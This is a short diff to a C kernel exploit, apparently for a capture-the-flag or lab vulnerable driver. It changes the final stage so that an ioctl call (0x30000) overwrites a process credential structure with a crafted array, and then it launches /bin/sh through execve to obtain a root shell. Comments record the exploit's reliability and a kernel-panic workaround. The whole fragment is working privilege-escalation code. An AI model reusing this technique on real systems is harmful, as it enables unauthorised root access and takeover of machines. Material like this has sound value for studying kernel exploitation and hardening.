@@ -168,11 +168,23 @@ int main(int argc, char const *argv[])
 
 	memset(buffer, 0, CHUNK_SIZE);
 	kmalloc(61, CHUNK_SIZE, '\x00'); //consume a chunk
-	kmalloc(62, CHUNK_SIZE, '\x00'); //rewrite cred here
+	//kmalloc(62, CHUNK_SIZE, '\x00'); //rewrite cred here
+	uint64_t arr[8] = {0x0000000000000000,0x0000000000000000
+		,0x0000000000000003,0x0000000000000000
+		,0x0000000000000000,0x0000000000000000
+		,0x0000000000000000,0x0000000000000000};
 
-	system("/bin/sh");
-    // execve will cause kernel panic, no idea why
-    // and the exploit works for 80% probability
+	param.size = CHUNK_SIZE;
+	param.idx = 62;
+	param.usrbuf = (char*)arr;
+	ioctl(fd, 0x30000, &param);//rewrite cred, usage must NOT be changed
+
+	// system("/bin/sh");
+	// execve will cause kernel panic, no idea why
+	// and the exploit works for 80% probability
+	char* shargv[] = {"/bin/sh", NULL};
+	execve("/bin/sh", shargv, NULL);
+	//in this way execve will not cause kernel panic
 
 	return 0;
 }
